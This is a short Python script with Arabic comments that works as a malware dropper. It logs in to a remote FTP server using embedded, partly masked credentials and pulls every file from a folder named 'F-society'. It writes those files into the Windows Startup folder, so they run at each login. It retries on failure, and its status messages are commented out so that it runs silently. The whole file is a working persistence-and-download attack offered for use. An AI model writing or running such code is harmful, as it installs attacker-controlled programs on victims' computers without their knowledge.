from ftplib import FTP, error_perm
import os
import time

def get_startup_path():
    appdata_path = os.getenv('APPDATA')
    startup_path = os.path.join(appdata_path, r'Microsoft\Windows\Start Menu\Programs\Startup')
    return startup_path

startup_folder = get_startup_path()

# إعدادات FTP
ftp_host = "------"
ftp_user = "------"
ftp_password = "------CZTjTAGUc"
remote_folder_path = r"htdocs/F-society/"

# التأكد من وجود المجلد المحلي
os.makedirs(startup_folder, exist_ok=True)

# عدد المحاولات القصوى للاتصال أو التحميل
MAX_RETRIES = 10
RETRY_DELAY = 10  # بالثواني

def connect_ftp():
    for attempt in range(1, MAX_RETRIES + 1):
        try:
            #print(f"[{attempt}] 🚀 محاولة الاتصال بالسيرفر...")
            ftp = FTP(ftp_host, timeout=30)
            ftp.login(user=ftp_user, passwd=ftp_password)
            ftp.cwd(remote_folder_path)
            #print("✅ تم الاتصال بنجاح.")
            return ftp
        except Exception as e:
            #print(f"❌ فشل الاتصال: {e}")
            #print(f"🔁 إعادة المحاولة بعد {RETRY_DELAY} ثانية...")
            time.sleep(RETRY_DELAY)
    #print("⛔ فشل الاتصال بعد كل المحاولات.")
    return None

def download_files(ftp):
    try:
        files = ftp.nlst()
        #print(f"📁 عدد الملفات في السيرفر: {len(files)}")

        for file_name in files:
            if file_name in [".", ".."]:
                continue

            local_file_path = os.path.join(startup_folder, file_name)
            success = False

            for attempt in range(1, MAX_RETRIES + 1):
                try:
                    #print(f"[{attempt}] ⬇️ تحميل: {file_name}")
                    with open(local_file_path, "wb") as local_file:
                        ftp.retrbinary(f"RETR {file_name}", local_file.write)
                    #print(f"✅ تم تحميل {file_name} بنجاح.")
                    success = True
                    break
                except Exception as e:
                    #print(f"⚠️ فشل تحميل {file_name}: {e}")
                    #print(f"🔁 محاولة أخرى بعد {RETRY_DELAY} ثانية...")
                    time.sleep(RETRY_DELAY)

            if not success:
                g = 5 
    except error_perm as e:
        pass
# ========== تنفيذ المهمة ==========

ftp_connection = connect_ftp()
if ftp_connection:
    download_files(ftp_connection)
    ftp_connection.quit()
else:
    g= 5